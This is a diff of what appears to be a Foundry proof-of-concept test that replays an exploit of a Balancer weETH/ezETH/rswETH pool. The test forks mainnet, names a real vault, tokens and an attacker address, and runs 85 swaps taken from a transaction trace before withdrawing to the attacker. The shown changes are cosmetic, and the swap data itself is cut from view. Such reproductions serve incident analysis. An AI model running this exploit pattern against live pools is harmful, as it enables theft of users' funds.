@@ -48,7 +48,6 @@ interface IBalancerVault {
         );
 
     function manageUserBalance(UserBalanceOp[] memory ops) external payable;
-
     function getInternalBalance(address user, IERC20[] memory tokens)
         external view
         returns (uint256[] memory balances);
@@ -65,14 +64,11 @@ interface IERC20 {
 
 contract BalancerTriplePoolTest is Test {
     IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-
-    // Pool: weETH/ezETH/rswETH (Ethereum)
     bytes32 constant POOL_ID_TRIPLE = 0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a;
     address constant TRIPLE_BPT = 0x848a5564158d84b8A8fb68ab5D004Fae11619A54;
     address constant ezETH = 0xbf5495Efe5DB9ce00f80364C8B423567e58d2110;
     address constant weETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
     address constant rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
-
     address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);
 
     struct ExactSwapData {
@@ -90,9 +86,7 @@ contract BalancerTriplePoolTest is Test {
             23717101
         );
 
-        console.log("=== TRIPLE POOL TEST (weETH/ezETH/rswETH) ===");
         console.log("Pool: weETH/ezETH/rswETH (0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a)");
-
         (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_TRIPLE);
 
         console.log("INITIAL STATE:");
@@ -117,7 +111,7 @@ contract BalancerTriplePoolTest is Test {
             toInternalBalance: true
         });
 
-        // Exact swaps from transaction trace
+        // swaps from transaction trace
         ExactSwapData[85] memory swaps;
 
         swaps[0] = ExactSwapData({
@@ -909,8 +903,6 @@ contract BalancerTriplePoolTest is Test {
         console.log("Swaps executed:", successCount, "/", swaps.length);
 
         // Withdrawal via manageUserBalance
-        console.log("=== WITHDRAWAL manageUserBalance() ===");
-
         IERC20[] memory internalTokens = new IERC20[](4);
         internalTokens[0] = IERC20(TRIPLE_BPT);
         internalTokens[1] = IERC20(ezETH);
@@ -995,7 +987,7 @@ contract BalancerTriplePoolTest is Test {
         console.log("weETH:", IERC20(weETH).balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("rswETH:", IERC20(rswETH).balanceOf(ATTACKER) / 1e18, "ETH");
 
-        console.log("Total swaps executed:", successCount);
+        console.log("Total swaps:", successCount);
         console.log("SUCCESS!");
     }
 
